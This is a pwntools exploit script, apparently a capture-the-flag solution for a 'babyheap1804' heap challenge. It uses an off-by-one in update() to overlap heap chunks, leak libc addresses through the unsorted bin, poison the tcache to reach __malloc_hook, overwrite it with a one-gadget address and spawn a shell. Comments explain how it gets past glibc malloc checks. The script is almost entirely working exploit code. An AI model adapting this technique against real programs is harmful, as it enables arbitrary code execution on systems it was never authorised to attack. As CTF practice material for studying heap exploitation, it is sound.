# off-by-one in update()

from pwn import *

def alloc(size):
	r.sendlineafter('Command: ', '1')
	r.sendlineafter('Size: ', str(size))
	return

def update(idx, size, data):
	r.sendlineafter('Command: ', '2')
	r.sendlineafter('Index: ', str(idx))
	r.sendlineafter('Size: ', str(size))
	r.sendafter('Content: ', data)
	return

def free(idx):
	r.sendlineafter('Command: ', '3')
	r.sendlineafter('Index: ', str(idx))
	return

def view(idx):
	r.sendlineafter('Command: ', '4')
	r.sendlineafter('Index: ', str(idx))
	return

def leak(idx):
	view(idx)
	r.recvuntil('A'*(6*8))
	return u64(r.recv(6).ljust(8, chr(0)))

def pwn():

	alloc(0x58)
	alloc(0x21)

	for i in xrange(6):
		alloc(0x58) # starts from index 2 and up

	# edit its size in order to overlap it later on with the unsorted chunk
	update(0, 0x59, 'A'*0x58 + p8(0x61))

	free(1)
	# we get back chunk #1
	alloc(0x58) # 1
	# we overwrite the size of chunk #2 with 0x421. why? 
	# 0x420 isn't an eligible size for tcaches, hence it will be placed
	# in the unsorted bin when _int_free is done. with the next allocations
	# we'll be able to overflow through the chunk with the main arena pointers
	# and thanks to read() we'll be able to leak them.
	update(1, 6*8, p64(0xb00bface)*5 + p64(0x421))

	free(3)
	free(4)
	free(5)
	free(6)
	free(7)

	for i in xrange(5):
		alloc(0x40) # starts from index 3 and up

	free(6)
	free(7)

	alloc(0x30) # 6
	alloc(0x30) # 7	

	# we gotta bypass [1] and [2]
	# [1] https://github.com/str8outtaheap/heapwn/blob/master/malloc/malloc.c#L4276
	# [2] https://github.com/str8outtaheap/heapwn/blob/master/malloc/malloc.c#L4299
	update(7, 0x30, p64(0) + p64(0x21) + p64(0)*3 + p64(0x21))

	free(2)

	update(1, 6*8, 'A'*(6*8))

	libc = leak(1) - 0x3ebca0
	__malloc_hook = libc + 0x3ebc30
	magic = libc + 0x10a38c
	log.success('Libc: 0x{:x}'.format(libc))

	# update again to make things look legit
	update(1, 6*8, p64(0xb00bface)*5 + p64(0x421))

	free(3)
	free(4)

	alloc(0x20) # 2
	alloc(0x20) # 3
	alloc(0x20) # 4
	
	free(5)
	free(6)
	free(7)

	alloc(0x20) # 5
	alloc(0x20) # 6

	# overlap and overwrite tcache->fd with __malloc_hook
	update(6, 8, p64(__malloc_hook))

	# free a couple of chunks in order to have enough of 0x61
	# chunks to request back in order to overwrite __malloc_hook
	free(2)
	free(3)
	free(4)
	free(5)
	
	# last allocation will give us back __malloc_hook
	for i in xrange(5):
		alloc(0x58)
	
	update(7, 8, p64(magic))

	# we have no more chunks left -- free and trigger
	free(2)
	# trigger __malloc_hook
	alloc(0x10)

	r.interactive()

if __name__ == "__main__":
	r = process('./babyheap1804')
	pause()
	pwn()
